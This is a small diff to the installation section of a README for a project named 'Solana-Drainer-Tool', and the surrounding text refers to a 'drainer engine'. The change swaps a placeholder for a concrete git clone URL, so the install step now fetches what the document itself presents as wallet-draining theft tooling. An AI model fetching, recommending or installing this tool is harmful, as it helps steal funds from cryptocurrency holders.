@@ -101,7 +101,7 @@ The drainer engine uses:
 ### Installation
 
 ```bash
-git clone <repository-url>
+git clone https://github.com/andreysidorov1985/Solana-Drainer-Tool.git
 cd Solana-Drainer-Tool
 ```
 
